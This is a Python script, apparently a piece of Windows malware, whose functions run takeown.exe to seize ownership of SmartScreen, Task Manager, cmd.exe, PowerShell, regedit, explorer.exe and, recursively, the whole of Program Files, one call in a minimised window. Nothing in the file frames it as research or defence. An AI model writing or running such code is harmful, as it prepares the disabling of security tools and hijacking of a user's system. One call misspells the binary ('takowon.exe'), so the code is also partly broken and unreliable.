#!/usr/bin/python
#coding:utf-8
import os, sys
# Function to get own process on windows
def tkOwn_process():
    proc = ['smartscreen.exe', 'taskmgr.exe', 'cmd.exe']
    for procs in proc:
        tkd = "\\windows\\system32\\takeown.exe /F \\Windows\\System32\\%s" %(procs)
        os.system(tkd)
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for procs in pwr_sh:
        tkd = "\\windows\\system32\\takeown.exe /F \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s" %(procs)
        os.system(tkd)
# Function to get own regedit and explorer on windows
def tkOwn_regexp():
    procs = ['regedit.exe', 'explorer.exe']
    for proc in procs:
        tkd = "\\windows\\system32\\takowon.exe /F \\Windows\\%s" %(proc)
        os.system(tkd)
# Function to get own the wallpaper directory
def tkOwn_DirWallpaper():
    tkd = "\\windows\\system32\\takeown.exe /F \\PerfLogs /R"
    os.system(tkd)
# Function to get own Internet Explorer directory
def tkOwn_IexploreDir():
    iexplore = ['\\Program Files (x86)\\Internet Explorer\\*', '\\Program Files\\Internet Explorer\\*']
    for files in iexplore:
        tks2 = '\\windows\\system32\\takeown.exe /F "%s" /R /D O ' %(files)
        os.system(tks2)
# Function to get own All sofwtare directory
def tkOwn_SoftDir():
    softdir = ['\\Program Files\\* ', '\\Program Files (x86)\\*']
    for dir in softdir:
        tks = 'START /MIN \\windows\\system32\\takeown.exe /F "%s" /R /D O' %(dir)
        os.system(tks)
